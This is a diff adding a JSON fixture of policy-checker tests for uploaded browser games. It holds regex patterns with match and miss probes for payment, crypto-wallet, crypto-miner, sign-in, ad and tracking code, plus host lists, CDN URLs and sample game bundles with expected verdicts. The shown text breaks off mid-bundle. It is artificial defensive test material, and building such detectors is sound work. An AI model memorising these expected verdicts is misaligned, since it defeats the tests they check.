@@ -1,0 +1,1857 @@
+{
+  "_whyThePatternIsRepeated": "The regex text is copied from limits.json on purpose, as the key. A pattern edited in limits.json without its probes updated fails the JavaScript test by name rather than quietly testing the old one.",
+  "_misses": "Each miss is chosen to sit next to the boundary that decides it: a word character in front of `window`, an `s` after `Transaction`, `signInAnonymously` beside the Firebase names. A pattern loosened past its boundary trips its own misses first.",
+  "patterns": [
+    {
+      "service": "Stripe",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bStripe\\(\\s*['\"`]pk_(?:live|test)_",
+      "flags": "",
+      "matches": [
+        "const stripe = Stripe('pk_test_abc');",
+        "var s=Stripe( \"pk_live_abc\",{locale:\"en\"})",
+        "const s = Stripe(`pk_live_abc`);"
+      ],
+      "misses": [
+        "const s = Stripe(key);",
+        "MyStripe('pk_test_abc')",
+        "drawStripe('pk_test')"
+      ]
+    },
+    {
+      "service": "PayPal",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bpaypal\\.Buttons\\s*\\(",
+      "flags": "",
+      "matches": [
+        "paypal.Buttons({ createOrder })",
+        "window.paypal.Buttons ({})"
+      ],
+      "misses": [
+        "if (paypal.Buttons) render();",
+        "mypaypal.ButtonsX("
+      ]
+    },
+    {
+      "service": "PayPal",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bbraintree\\.dropin\\.create\\s*\\(",
+      "flags": "",
+      "matches": [
+        "braintree.dropin.create({ authorization })"
+      ],
+      "misses": [
+        "braintree.dropin.teardown()",
+        "if (braintree.dropin) {}"
+      ]
+    },
+    {
+      "service": "Paddle",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bPaddle\\.Checkout\\.open\\s*\\(",
+      "flags": "",
+      "matches": [
+        "Paddle.Checkout.open({ items })"
+      ],
+      "misses": [
+        "Paddle.Checkout.close()",
+        "paddle.checkout.open({})"
+      ]
+    },
+    {
+      "service": "Google Pay",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bgoogle\\.payments\\.api\\.PaymentsClient\\b",
+      "flags": "",
+      "matches": [
+        "new google.payments.api.PaymentsClient({ environment: 'TEST' })"
+      ],
+      "misses": [
+        "google.payments.api.PaymentsClientX",
+        "google.payments.apiPaymentsClient"
+      ]
+    },
+    {
+      "service": "Apple Pay",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bnew\\s+ApplePaySession\\s*\\(",
+      "flags": "",
+      "matches": [
+        "const s = new ApplePaySession(3, request);"
+      ],
+      "misses": [
+        "if (window.ApplePaySession && ApplePaySession.canMakePayments()) {}"
+      ]
+    },
+    {
+      "service": "the Payment Request API",
+      "category": "payments",
+      "severity": "blocker",
+      "pattern": "\\bnew\\s+PaymentRequest\\s*\\(",
+      "flags": "",
+      "matches": [
+        "const r = new PaymentRequest(methods, details);"
+      ],
+      "misses": [
+        "if (window.PaymentRequest) {}",
+        "new PaymentRequestish()"
+      ]
+    },
+    {
+      "service": "a tip jar",
+      "category": "payments",
+      "severity": "warning",
+      "pattern": "github\\.com/sponsors/",
+      "flags": "i",
+      "matches": [
+        "https://github.com/sponsors/somebody",
+        "GITHUB.COM/SPONSORS/x"
+      ],
+      "misses": [
+        "https://github.com/somebody/sponsors",
+        "github.com/sponsor"
+      ]
+    },
+    {
+      "service": "a tip jar",
+      "category": "payments",
+      "severity": "warning",
+      "pattern": "opencollective\\.com/[a-z0-9-]+/(?:donate|contribute)",
+      "flags": "i",
+      "matches": [
+        "https://opencollective.com/peer/donate",
+        "opencollective.com/three-js/contribute"
+      ],
+      "misses": [
+        "https://opencollective.com/peer",
+        "\"funding\":{\"url\":\"https://opencollective.com/peer\"}"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "warning",
+      "pattern": "\\bwindow\\.ethereum\\b",
+      "flags": "",
+      "matches": [
+        "if (window.ethereum) connect();"
+      ],
+      "misses": [
+        "window.ethereumish",
+        "mywindow.ethereum"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "warning",
+      "pattern": "\\beth_requestAccounts\\b",
+      "flags": "",
+      "matches": [
+        "await provider.request({ method: 'eth_requestAccounts' })",
+        "async signInWithWeb3(c){const a=await w.request({method:`eth_requestAccounts`});return a}"
+      ],
+      "misses": [
+        "eth_requestAccountsX"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\beth_sendTransaction\\b",
+      "flags": "",
+      "matches": [
+        "provider.request({method:\"eth_sendTransaction\",params})"
+      ],
+      "misses": [
+        "eth_sendTransactions"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\beth_sign\\b",
+      "flags": "",
+      "matches": [
+        "w.request({method:\"eth_sign\",params:[a,h]})",
+        "method:`eth_sign`"
+      ],
+      "misses": [
+        "eth_signTypedData_v4",
+        "personal_sign",
+        "eth_signer"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\beth_signTypedData(?:_v[134])?\\b",
+      "flags": "",
+      "matches": [
+        "method:\"eth_signTypedData_v4\"",
+        "eth_signTypedData_v3",
+        "eth_signTypedData"
+      ],
+      "misses": [
+        "eth_signTypedDataX",
+        "eth_sign"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\bwallet_sendCalls\\b",
+      "flags": "",
+      "matches": [
+        "provider.request({method:\"wallet_sendCalls\",params:[{version:\"2.0.0\",calls}]})",
+        "method:`wallet_sendCalls`"
+      ],
+      "misses": [
+        "wallet_getCallsStatus",
+        "wallet_sendCallsX",
+        "my_wallet_sendCalls"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "warning",
+      "pattern": "\\bpersonal_sign\\b",
+      "flags": "",
+      "matches": [
+        "request({method:\"personal_sign\",params:[m,a]})"
+      ],
+      "misses": [
+        "personal_signature",
+        "impersonal_sign"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "warning",
+      "pattern": "\\bwallet_switchEthereumChain\\b",
+      "flags": "",
+      "matches": [
+        "request({ method: 'wallet_switchEthereumChain' })"
+      ],
+      "misses": [
+        "wallet_switchEthereumChainId"
+      ]
+    },
+    {
+      "service": "a crypto wallet",
+      "category": "crypto",
+      "severity": "warning",
+      "pattern": "\\bwindow\\.(?:solana|phantom)\\b",
+      "flags": "",
+      "matches": [
+        "window.solana.connect()",
+        "window.phantom?.solana"
+      ],
+      "misses": [
+        "window.solanaX",
+        "mywindow.phantom"
+      ]
+    },
+    {
+      "service": "a crypto miner",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\bCoinHive\\.(?:Anonymous|User|Token)\\b",
+      "flags": "",
+      "matches": [
+        "const m = new CoinHive.Anonymous('key');",
+        "CoinHive.User('k','u')"
+      ],
+      "misses": [
+        "CoinHive.Miner",
+        "MyCoinHive.Anonymous"
+      ]
+    },
+    {
+      "service": "a crypto miner",
+      "category": "crypto",
+      "severity": "blocker",
+      "pattern": "\\bstratum\\+(?:tcp|ssl)://",
+      "flags": "i",
+      "matches": [
+        "stratum+tcp://pool.example:3333",
+        "STRATUM+SSL://pool.example:443"
+      ],
+      "misses": [
+        "stratum+udp://pool.example",
+        "stratum://pool.example"
+      ]
+    },
+    {
+      "service": "Google sign-in",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "\\bgoogle\\.accounts\\.(?:id|oauth2)\\.",
+      "flags": "",
+      "matches": [
+        "google.accounts.id.initialize({ client_id })",
+        "google.accounts.oauth2.initTokenClient({})"
+      ],
+      "misses": [
+        "google.accounts.identity.x",
+        "google.accounts.id"
+      ]
+    },
+    {
+      "service": "Sign in with Apple",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "\\bAppleID\\.auth\\.(?:init|signIn)\\s*\\(",
+      "flags": "",
+      "matches": [
+        "AppleID.auth.init({ clientId })",
+        "await AppleID.auth.signIn()"
+      ],
+      "misses": [
+        "AppleID.auth.signOut()",
+        "AppleID.authinit()"
+      ]
+    },
+    {
+      "service": "Facebook login",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "\\bFB\\.login\\s*\\(",
+      "flags": "",
+      "matches": [
+        "FB.login(function (r) {}, { scope: 'email' })"
+      ],
+      "misses": [
+        "FB.loginStatus",
+        "FB.getLoginStatus(cb)"
+      ]
+    },
+    {
+      "service": "Facebook login",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "facebook\\.com/(?:v[0-9.]+/)?dialog/oauth",
+      "flags": "i",
+      "matches": [
+        "https://www.facebook.com/v19.0/dialog/oauth?client_id=1",
+        "FACEBOOK.COM/dialog/oauth"
+      ],
+      "misses": [
+        "https://www.facebook.com/dialog/share?app_id=1",
+        "facebook.com/vX/dialog/oauth"
+      ]
+    },
+    {
+      "service": "an OAuth sign-in",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "discord(?:app)?\\.com/(?:api/)?oauth2/authorize",
+      "flags": "i",
+      "matches": [
+        "https://discord.com/api/oauth2/authorize?client_id=1",
+        "discordapp.com/oauth2/authorize"
+      ],
+      "misses": [
+        "https://discord.com/api/oauth2/token",
+        "https://discord.gg/invite"
+      ]
+    },
+    {
+      "service": "an OAuth sign-in",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "github\\.com/login/oauth/authorize",
+      "flags": "i",
+      "matches": [
+        "https://github.com/login/oauth/authorize?client_id=x"
+      ],
+      "misses": [
+        "https://github.com/login",
+        "https://github.com/login/oauth/access_token"
+      ]
+    },
+    {
+      "service": "an OAuth sign-in",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "id\\.twitch\\.tv/oauth2/authorize",
+      "flags": "i",
+      "matches": [
+        "https://id.twitch.tv/oauth2/authorize?response_type=token"
+      ],
+      "misses": [
+        "https://id.twitch.tv/oauth2/token"
+      ]
+    },
+    {
+      "service": "an OAuth sign-in",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "steamcommunity\\.com/openid/login",
+      "flags": "i",
+      "matches": [
+        "https://steamcommunity.com/openid/login?openid.mode=checkid_setup"
+      ],
+      "misses": [
+        "https://steamcommunity.com/id/someone"
+      ]
+    },
+    {
+      "service": "a sign-in service",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "cognito-idp\\.[a-z0-9-]+\\.amazonaws\\.com",
+      "flags": "i",
+      "matches": [
+        "https://cognito-idp.us-east-1.amazonaws.com/",
+        "COGNITO-IDP.eu-west-2.amazonaws.com"
+      ],
+      "misses": [
+        "https://cognito-identity.us-east-1.amazonaws.com/",
+        "cognito-idp.amazonaws.com"
+      ]
+    },
+    {
+      "service": "Supabase sign-up",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "\\.auth\\.(?:signUp|signInWithPassword|signInWithOtp|signInWithOAuth)\\s*\\(",
+      "flags": "",
+      "matches": [
+        "await supabase.auth.signUp({ email, password })",
+        "client.auth.signInWithOtp({ email })",
+        "sb.auth.signInWithPassword ({})",
+        "sb.auth.signInWithOAuth({ provider: 'github' })"
+      ],
+      "misses": [
+        "await supabase.auth.signInAnonymously()",
+        "supabase.auth.getSession()",
+        "auth.signUp("
+      ]
+    },
+    {
+      "service": "Firebase email sign-in",
+      "category": "accounts",
+      "severity": "warning",
+      "pattern": "\\b(?:createUserWithEmailAndPassword|signInWithEmailAndPassword|sendSignInLinkToEmail)\\b",
+      "flags": "",
+      "matches": [
+        "signInWithEmailAndPassword(auth, email, password)",
+        "createUserWithEmailAndPassword(auth, e, p)",
+        "sendSignInLinkToEmail(auth, email, settings)"
+      ],
+      "misses": [
+        "signInAnonymously(auth)",
+        "signInWithEmailLink(auth, email)"
+      ]
+    },
+    {
+      "service": "PlayFab email sign-in",
+      "category": "accounts",
+      "severity": "warning",
+      "pattern": "\\b(?:RegisterPlayFabUser|LoginWithEmailAddress|AddUsernamePassword)\\b",
+      "flags": "",
+      "matches": [
+        "PlayFabClientSDK.RegisterPlayFabUser(request, cb)",
+        "PlayFabClientSDK.LoginWithEmailAddress(r, cb)",
+        "AddUsernamePassword"
+      ],
+      "misses": [
+        "PlayFabClientSDK.LoginWithCustomID(r, cb)"
+      ]
+    },
+    {
+      "service": "an email sign-up form",
+      "category": "accounts",
+      "severity": "blocker",
+      "pattern": "docs\\.google\\.com/forms/",
+      "flags": "i",
+      "matches": [
+        "https://docs.google.com/forms/d/e/abc/viewform",
+        "DOCS.GOOGLE.COM/forms/x"
+      ],
+      "misses": [
+        "https://docs.google.com/document/d/abc",
+        "https://docs.google.com/spreadsheets/d/x"
+      ]
+    },
+    {
+      "service": "an ad network",
+      "category": "ads",
+      "severity": "blocker",
+      "pattern": "\\badsbygoogle\\b",
+      "flags": "",
+      "matches": [
+        "(adsbygoogle = window.adsbygoogle || []).push({});",
+        "<ins class=\"adsbygoogle\"></ins>"
+      ],
+      "misses": [
+        "myadsbygoogle",
+        "adsbygoogleX"
+      ]
+    },
+    {
+      "service": "a game portal SDK",
+      "category": "ads",
+      "severity": "blocker",
+      "pattern": "\\bPokiSDK\\.(?:init|commercialBreak|rewardedBreak)\\s*\\(",
+      "flags": "",
+      "matches": [
+        "PokiSDK.init().then(start)",
+        "PokiSDK.commercialBreak()",
+        "PokiSDK.rewardedBreak ()"
+      ],
+      "misses": [
+        "PokiSDK.gameplayStart()",
+        "PokiSDK.init"
+      ]
+    },
+    {
+      "service": "a game portal SDK",
+      "category": "ads",
+      "severity": "blocker",
+      "pattern": "\\bCrazyGames\\.SDK\\.ad\\.",
+      "flags": "",
+      "matches": [
+        "window.CrazyGames.SDK.ad.requestAd('midgame', cb)"
+      ],
+      "misses": [
+        "CrazyGames.SDK.game.gameplayStart()"
+      ]
+    },
+    {
+      "service": "an ad pixel",
+      "category": "tracking",
+      "severity": "blocker",
+      "pattern": "\\bfbq\\(\\s*['\"]init['\"]",
+      "flags": "",
+      "matches": [
+        "fbq('init', '1234567890')",
+        "fbq( \"init\",\"1\")"
+      ],
+      "misses": [
+        "fbq('track', 'PageView')",
+        "myfbq('init')"
+      ]
+    },
+    {
+      "service": "an ad pixel",
+      "category": "tracking",
+      "severity": "blocker",
+      "pattern": "\\bgtag\\(\\s*['\"]config['\"]",
+      "flags": "",
+      "matches": [
+        "gtag('config', 'G-ABC123')",
+        "gtag( \"config\" , \"G-1\")"
+      ],
+      "misses": [
+        "gtag('event', 'level_up')",
+        "gtag('js', new Date())"
+      ]
+    }
+  ],
+  "reviewSignals": [
+    {
+      "label": "an email field",
+      "category": "accounts",
+      "pattern": "<input\\b[^<>]{0,512}\\btype\\s*=\\s*['\"]?email\\b",
+      "flags": "i",
+      "matches": [
+        "<input type=\"email\" name=\"e\">",
+        "<INPUT id=x TYPE=email>",
+        "<input class=\"f\" type = 'email'>"
+      ],
+      "misses": [
+        "<input type=\"emailish\">",
+        "<input type=\"text\" placeholder=\"email\">"
+      ]
+    },
+    {
+      "label": "a password field",
+      "category": "accounts",
+      "pattern": "<input\\b[^<>]{0,512}\\btype\\s*=\\s*['\"]?password\\b",
+      "flags": "i",
+      "matches": [
+        "<input type='password'>",
+        "<input name=p type=password required>"
+      ],
+      "misses": [
+        "<input type=\"text\" placeholder=\"password\">",
+        "<input type=\"passwords\">"
+      ]
+    }
+  ],
+  "decoys": [
+    "<input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input <input ",
+    "signInAnonymously(auth).then(() => start());",
+    "fetch('https://api.openai.com/v1/chat/completions', { method: 'POST', headers, body })",
+    "fetch('https://api.anthropic.com/v1/messages', { method: 'POST' })",
+    "const ws = new WebSocket('wss://lobby.mygame.example/room');",
+    "import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.160.0/+esm';",
+    "const stripes = drawStripes(ctx); const s = new Stripe(texture);",
+    "gtag('event', 'level_up', { level: 3 });",
+    "<input type=\"text\" name=\"room\" placeholder=\"Room code\">",
+    "const ethereumColor = '#627eea'; // a planet named after the chain",
+    "og.player.name; og.openLink('https://example.com/credits');",
+    "<a href=\"https://github.com/someone/game\">Source</a>"
+  ],
+  "hosts": {
+    "blocked": [
+      {
+        "host": "js.stripe.com",
+        "service": "Stripe"
+      },
+      {
+        "host": "checkout.stripe.com",
+        "service": "Stripe"
+      },
+      {
+        "host": "stripe.com",
+        "service": "Stripe"
+      },
+      {
+        "host": "ko-fi.com",
+        "service": "a tip jar"
+      },
+      {
+        "host": "www.buymeacoffee.com",
+        "service": "a tip jar"
+      },
+      {
+        "host": "cdn.walletconnect.com",
+        "service": "a crypto wallet"
+      },
+      {
+        "host": "accounts.google.com",
+        "service": "Google sign-in"
+      },
+      {
+        "host": "pay.google.com",
+        "service": "Google Pay"
+      },
+      {
+        "host": "pagead2.googlesyndication.com",
+        "service": "an ad network"
+      },
+      {
+        "host": "www.googletagmanager.com",
+        "service": "an ad pixel"
+      },
+      {
+        "host": "JS.STRIPE.COM.",
+        "service": "Stripe"
+      },
+      {
+        "host": "streamlabs.com",
+        "service": "a tip jar"
+      }
+    ],
+    "allowed": [
+      "api.openai.com",
+      "api.anthropic.com",
+      "generativelanguage.googleapis.com",
+      "cdn.jsdelivr.net",
+      "unpkg.com",
+      "www.google.com",
+      "google.com",
+      "apis.google.com",
+      "facebook.com",
+      "notstripe.com",
+      "stripe.com.evil.example",
+      "mystripe.com",
+      "rtc.opengame.gg",
+      "lobby.mygame.example"
+    ]
+  },
+  "_packages": "`packages` holds script CDN URLs and the blocked package group each one serves, or null. Each CDN's own way of putting a prefix or a version around the npm name has a row, because that is where the two readers' hand-written path parsers could part. The nulls sit next to the boundary: a package that only starts like a blocked one, a blocked name on a host that is not a CDN, a scope with no package after it.",
+  "packages": [
+    {
+      "url": "https://esm.sh/@stripe/stripe-js@4",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://esm.sh/v135/@stripe/stripe-js@4.1.0/es2022/stripe-js.mjs",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://esm.sh/stable/@paypal/paypal-js",
+      "service": "PayPal"
+    },
+    {
+      "url": "https://esm.sh/*@stripe/stripe-js",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://unpkg.com/@stripe/stripe-js@4/dist/stripe.js",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://unpkg.com/browse/braintree-web@3.103.0/",
+      "service": "PayPal"
+    },
+    {
+      "url": "https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider",
+      "service": "a crypto wallet"
+    },
+    {
+      "url": "https://cdn.jsdelivr.net/npm/ethers@6/+esm",
+      "service": "a crypto library"
+    },
+    {
+      "url": "https://cdn.jsdelivr.net/combine/npm/three@0.160,npm/@metamask/sdk@0.20",
+      "service": "a crypto wallet"
+    },
+    {
+      "url": "https://cdn.skypack.dev/ethers",
+      "service": "a crypto library"
+    },
+    {
+      "url": "https://cdn.skypack.dev/-/ethers@v5.7.2-abcdef/dist=es2019,mode=imports/optimized/ethers.js",
+      "service": "a crypto library"
+    },
+    {
+      "url": "https://ga.jspm.io/npm:@stripe/stripe-js@4.0.0/dist/stripe.mjs",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://jspm.dev/npm:@clerk/clerk-js",
+      "service": "a sign-in service"
+    },
+    {
+      "url": "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js",
+      "service": "a crypto library"
+    },
+    {
+      "url": "https://esm.run/@web3modal/wagmi",
+      "service": "a crypto wallet"
+    },
+    {
+      "url": "//esm.sh/%40stripe/stripe-js",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://ESM.SH/@Stripe/Stripe-JS",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://esm.sh/three/../@stripe/stripe-js",
+      "service": "Stripe"
+    },
+    {
+      "url": "https://cdn.esm.sh/logrocket@8",
+      "service": "session recording"
+    },
+    {
+      "url": "https://cdn.jsdelivr.net/npm/@paddle/paddle-js@1/+esm",
+      "service": "Paddle"
+    },
+    {
+      "url": "https://esm.sh/@solana/web3.js@1.95",
+      "service": "a crypto library"
+    },
+    {
+      "url": "https://esm.sh/three@0.160",
+      "service": null
+    },
+    {
+      "url": "https://esm.sh/stripe-like",
+      "service": null
+    },
+    {
+      "url": "https://esm.sh/@solana/spl-token",
+      "service": null
+    },
+    {
+      "url": "https://esm.sh/web3modal",
+      "service": null
+    },
+    {
+      "url": "https://esm.sh/@stripe/",
+      "service": null
+    },
+    {
+      "url": "https://cdn.jsdelivr.net/gh/stripe/stripe-js/dist/stripe.js",
+      "service": null
+    },
+    {
+      "url": "https://example.com/npm/@stripe/stripe-js",
+      "service": null
+    },
+    {
+      "url": "https://esm.sh.evil.example/@stripe/stripe-js",
+      "service": null
+    },
+    {
+      "url": "https://unpkg.com/ethers-utils",
+      "service": null
+    }
+  ],
+  "_bundles": "`bundles` are whole games, small, each with the verdict both checkers must reach on it: `blocker` when anything refuses the upload, `warning` when something is put in front of a reviewer and nothing refuses, `pass` when gamePolicy has nothing to say. packages/preflight/tests/game-policy.test.ts runs each through platformPreflight and apps/pipeline/tests/test_game_policy.py through content.scan_content on contract 2027-03, so the jam scan and `opengame check` cannot disagree about one of them without a suite failing. Most are the review of 26 Oct 2026, by its fixture names, which found twenty shapes the preflight refused and the jam scan only mentioned.",
+  "bundles": [
+    {
+      "id": "a02_importmap",
+      "verdict": "blocker",
+      "why": "an import map is a fetch list",
+      "files": {
+        "game.js": "import \"pay\"; start();",
+        "index.html": "<!doctype html><html><head><script type=\"importmap\">{\"imports\":{\"pay\":\"https://js.stripe.com/v3/\"}}</script></head><body><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a04_worker",
+      "verdict": "blocker",
+      "why": "new Worker loads a script",
+      "files": {
+        "game.js": "const w = new Worker(\"https://js.stripe.com/v3/worker.js\"); start();",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a08_template",
+      "verdict": "blocker",
+      "why": "a template literal with a hole is still the URL it starts with",
+      "files": {
+        "game.js": "const v = 3; const s = document.createElement(\"script\"); s.src = `https://js.stripe.com/v${v}`; document.head.append(s);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a09_chunkload",
+      "verdict": "blocker",
+      "why": "a webpack public path is where chunks load from",
+      "files": {
+        "game.js": "__webpack_require__.p = \"https://js.stripe.com/\"; __webpack_require__.l(__webpack_require__.p + \"v3\", done);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a10_esmsh",
+      "verdict": "blocker",
+      "why": "Stripe's SDK from esm.sh, a blocked package",
+      "files": {
+        "game.js": "import { loadStripe } from \"https://esm.sh/@stripe/stripe-js@4\"; loadStripe(KEY);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a12_stripejs_bundled",
+      "verdict": "blocker",
+      "why": "@stripe/stripe-js bundled: its loader names js.stripe.com",
+      "files": {
+        "game.js": "var V3_URL = \"https://js.stripe.com/v3\";\nvar V3_URL_REGEX = /^https:\\/\\/js\\.stripe\\.com\\/v3\\/?(\\?.*)?$/;\nvar injectScript = function injectScript(params) { var script = document.createElement(\"script\"); script.src = \"\".concat(V3_URL).concat(\"\"); (document.head || document.body).appendChild(script); return script; };\nvar loadStripe = function () { return Promise.resolve(window.Stripe).then(function (S) { return S.apply(undefined, arguments); }); };\nconst stripe = await loadStripe(import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a14_xhr",
+      "verdict": "blocker",
+      "why": "XMLHttpRequest",
+      "files": {
+        "game.js": "const x = new XMLHttpRequest(); x.open(\"POST\", \"https://api.stripe.com/v1/tokens\"); x.send();",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a15_iframe",
+      "verdict": "blocker",
+      "why": "an iframe loads the page",
+      "files": {
+        "game.js": "start();",
+        "index.html": "<!doctype html><html><body><iframe src=\"https://checkout.stripe.com/pay/cs_test_123\"></iframe><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a16_form",
+      "verdict": "blocker",
+      "why": "a form posts to the service",
+      "files": {
+        "game.js": "start();",
+        "index.html": "<!doctype html><html><body><form action=\"https://formspree.io/f/abcd\" method=\"POST\"><input name=\"name\"><button>Join</button></form><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a17_locationhref",
+      "verdict": "blocker",
+      "why": "a navigation",
+      "files": {
+        "game.js": "buyBtn.onclick = () => { location.href = \"https://buy.stripe.com/test_abc\"; };",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a18_windowopen",
+      "verdict": "blocker",
+      "why": "window.open",
+      "files": {
+        "game.js": "buyBtn.onclick = () => window.open(\"https://ko-fi.com/mygame\");",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a19_openlink",
+      "verdict": "blocker",
+      "why": "og.openLink opens a real tab",
+      "files": {
+        "game.js": "buyBtn.onclick = () => og.openLink(\"https://ko-fi.com/mygame\");",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a20_openlink_var",
+      "verdict": "blocker",
+      "why": "the same, through a const",
+      "files": {
+        "game.js": "const TIP = \"https://ko-fi.com/mygame\"; buyBtn.onclick = () => og.openLink(TIP);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a26_skypack",
+      "verdict": "blocker",
+      "why": "a wallet SDK from esm.sh beside ethers from Skypack",
+      "files": {
+        "game.js": "import { ethers } from \"https://cdn.skypack.dev/ethers\"; import { createWeb3Modal } from \"https://esm.sh/@web3modal/wagmi\";",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a27_unpkg_script",
+      "verdict": "blocker",
+      "why": "Stripe from unpkg, WalletConnect from jsDelivr",
+      "files": {
+        "game.js": "start();",
+        "index.html": "<!doctype html><html><body><script src=\"https://unpkg.com/@stripe/stripe-js@4/dist/stripe.js\"></script><script src=\"https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider\"></script><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a30_concat",
+      "verdict": "blocker",
+      "why": "a base URL concatenated",
+      "files": {
+        "game.js": "const base = \"https://js.stripe.com\"; load(base + \"/v3\");",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "d03_tpl_url",
+      "verdict": "blocker",
+      "why": "a backtick URL assigned to src",
+      "files": {
+        "game.js": "const s=document.createElement(`script`);s.src=`https://js.stripe.com/v3`;document.head.append(s);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "d04_tpl_fetch",
+      "verdict": "blocker",
+      "why": "fetch with a backtick URL",
+      "files": {
+        "game.js": "fetch(`https://api.stripe.com/v1/x`);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "f01_dupkey",
+      "verdict": "blocker",
+      "why": "a link and a navigation to one host: the navigation decides",
+      "files": {
+        "index.html": "<!doctype html><html><body><a href=\"https://ko-fi.com/me\">tip</a><script>btn.onclick=()=>{location.href=\"https://ko-fi.com/me\"}</script></body></html>"
+      }
+    },
+    {
+      "id": "g01_hotjar",
+      "verdict": "blocker",
+      "why": "the official Hotjar snippet",
+      "files": {
+        "game.js": "start();",
